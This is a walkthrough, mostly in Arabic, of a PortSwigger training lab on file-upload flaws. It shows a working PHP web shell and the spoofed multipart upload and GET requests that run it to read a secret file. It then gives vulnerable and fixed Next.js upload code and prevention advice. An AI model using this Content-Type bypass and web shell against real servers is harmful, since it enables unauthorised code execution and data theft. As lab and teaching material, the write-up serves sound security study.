# Lab: Web shell upload via Content-Type restriction bypass

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) حيث يعتمد الخادم فقط على `Content-Type` المرسل من المستخدم للتحقق من نوع الملف. يمكننا تغيير `Content-Type` إلى `image/jpeg` لتجاوز الفلتر، ثم رفع Web Shell وتنفيذه لقراءة `/home/carlos/secret`.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم المسار

- سجل الدخول بـ `wiener:peter`
- ارفع صورة عادية كـ avatar
- في Burp → **Proxy > HTTP history**، ابحث عن طلب `GET /files/avatars/<YOUR-IMAGE>`
- أرسل هذا الطلب إلى **Repeater** (لنستخدمه لاحقاً)

### الخطوة 2: إنشاء Web Shell

- أنشئ ملفاً باسم `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### الخطوة 3: محاولة رفع الملف (ستفشل)

- حاول رفع `exploit.php` كـ avatar
- **النتيجة:** رسالة خطأ: "Only image/jpeg and image/png are allowed"

### الخطوة 4: اعتراض طلب رفع الملف

- في Burp → **Proxy > HTTP history**، ابحث عن طلب `POST /my-account/avatar`
- أرسله إلى **Repeater**

الطلب الأصلي:

```http
POST /my-account/avatar HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

### الخطوة 5: تغيير Content-Type

- غيّر `Content-Type: application/x-php` إلى `Content-Type: image/jpeg`

**الطلب المعدل:**

```http
POST /my-account/avatar HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

### الخطوة 6: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم رفع الملف بنجاح ✅

### الخطوة 7: تنفيذ Web Shell

- في Repeater الآخر (الخاص بـ `GET /files/avatars/...`)
- غيّر اسم الملف إلى `exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

- اضغط **Send**

**النتيجة:** يظهر السر (secret) في الرد ✅

### الخطوة 8: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 9: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Content-Type؟** | هيدر يحدد نوع الملف المرسل (مثل `image/jpeg`, `application/x-php`) |
| **أين الثغرة؟** | الخادم يعتمد فقط على هذا الهيدر الذي يمكن تزويره بسهولة |
| **كيف نستغلها؟** | نغير `Content-Type` إلى `image/jpeg` لتجاوز الفلتر |
| **لماذا نجح هذا؟** | الخادم لا يتحقق من محتوى الملف الفعلي (magic bytes) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق فقط من `Content-Type` المرسل من المستخدم، والذي يمكن تزويره بسهولة.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/upload.js
export default function handler(req, res) {
  const file = files.avatar;
  
  // خطأ: التحقق فقط من Content-Type (قابل للتزوير)
  if (file.mimetype !== 'image/jpeg' && file.mimetype !== 'image/png') {
    return res.status(400).json({ error: 'Only images are allowed' });
  }
  
  // حفظ الملف...
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import { v4 as uuidv4 } from 'uuid';
import sharp from 'sharp';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, async (err, fields, files) => {
    const file = files.avatar;
    const extension = path.extname(file.originalFilename).toLowerCase();
    
    // التصحيح 1: whitelist للامتدادات
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // التصحيح 2: التحقق من المحتوى الفعلي (magic bytes)
    let isImage = false;
    try {
      const metadata = await sharp(file.filepath).metadata();
      isImage = metadata.format !== undefined;
    } catch {
      isImage = false;
    }
    
    if (!isImage) {
      return res.status(400).json({ error: 'Invalid image file' });
    }
    
    // التصحيح 3: إعادة تسمية الملف
    const safeFilename = `${uuidv4()}${extension}`;
    const targetPath = path.join(process.cwd(), 'public/files/avatars', safeFilename);
    
    fs.copyFileSync(file.filepath, targetPath);
    res.json({ success: true, filename: safeFilename });
  });
}
```

**الخلاصة:** 
1. لا تعتمد على `Content-Type` من المستخدم (يمكن تزويره)
2. تحقق من امتداد الملف باستخدام whitelist
3. تحقق من المحتوى الفعلي للملف (magic bytes)
4. أعد تسمية الملفات المرفوعة

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **التحقق من الامتداد** | استخدم whitelist للامتدادات المسموحة |
| **التحقق من المحتوى (Magic bytes)** | تأكد من أن الملف هو ما يدّعي أنه |
| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) |
| **منع التنفيذ** | امنع تنفيذ PHP في مجلد الرفع |
| **لا تعتمد على Content-Type** | يمكن تزويره بسهولة |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)

